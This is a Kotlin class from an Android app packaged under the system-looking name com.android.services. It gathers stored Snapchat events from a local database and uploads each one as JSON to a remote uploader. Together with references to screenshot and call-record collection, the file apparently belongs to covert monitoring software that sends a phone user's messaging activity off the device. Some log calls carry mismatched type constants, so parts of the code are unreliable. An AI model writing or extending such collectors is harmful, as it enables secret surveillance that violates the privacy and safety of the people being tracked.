package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.SnapChatEvent
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class SnapChatEventCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncSnapchat) {
            localDatabaseSource.selectSnapChatEvents { snapChatEvents ->
                if (snapChatEvents.isNotEmpty()) {
                    try {
                        val gson = GsonBuilder().create()
                        val mSnapChatEventJSON = JSONArray(
                            gson.toJson(
                                snapChatEvents,
                                object : TypeToken<List<SnapChatEvent>>() {}.type
                            )
                        )
                        val fileUploader =
                            FileUploader(
                                context,
                                AppConstants.SNAP_CHAT_EVENTS_TYPE,
                                localDatabaseSource
                            )
                        for (i in 0 until mSnapChatEventJSON.length()) {
                            try {
                                fileUploader.uploadFile(mSnapChatEventJSON.getJSONObject(i))
                            } catch (e: Exception) {
                                logException(e.message!!, AppConstants.SCREEN_SHOT_TYPE, e)
                            }
                        }
                    } catch (e: Exception) {
                        logException(e.message!!, AppConstants.SNAP_CHAT_EVENTS_TYPE, e)
                    }
                } else {
                    logVerbose("No SnapChatEvents found", AppConstants.SNAP_CHAT_EVENTS_TYPE)
                }
            }
        } else {
            logVerbose("${AppConstants.CALL_RECORD_TYPE} Sync is Off")
        }
    }
}